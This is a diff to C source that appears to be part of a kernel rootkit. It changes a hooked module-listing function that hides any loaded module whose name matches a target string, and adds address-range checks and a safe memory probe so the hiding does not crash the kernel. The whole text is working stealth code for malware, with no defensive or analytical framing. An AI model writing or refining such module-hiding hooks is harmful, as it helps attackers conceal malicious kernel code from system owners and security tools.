@@ -176,11 +176,19 @@ static int _nvk_mod_seq_show_filter(void *seq, void *v)
 
 	if (v && _nvk_hide_target_name) {
 		unsigned long list_addr = (unsigned long)v;
-		unsigned long mod_base = list_addr - NVK_OFF_LIST;
-		const char *name = (const char *)(mod_base + NVK_OFF_NAME);
-
-		if (_nvk_str_starts_with(name, _nvk_hide_target_name))
-			return 0;
+		if (list_addr >= 0xFFFF000000000000UL &&
+		    list_addr < 0xFFFFFFFFFFFFF000UL) {
+			unsigned long mod_base = list_addr - NVK_OFF_LIST;
+			unsigned char probe;
+			if (!nvk_mem_read(&probe, (void *)(mod_base + NVK_OFF_NAME), 1) &&
+			    probe >= 0x20 && probe <= 0x7E) {
+				const char *name =
+					(const char *)(mod_base + NVK_OFF_NAME);
+				if (_nvk_str_starts_with(name,
+							 _nvk_hide_target_name))
+					return 0;
+			}
+		}
 	}
 
 	return _nvk_orig_mod_seq_show(seq, v);
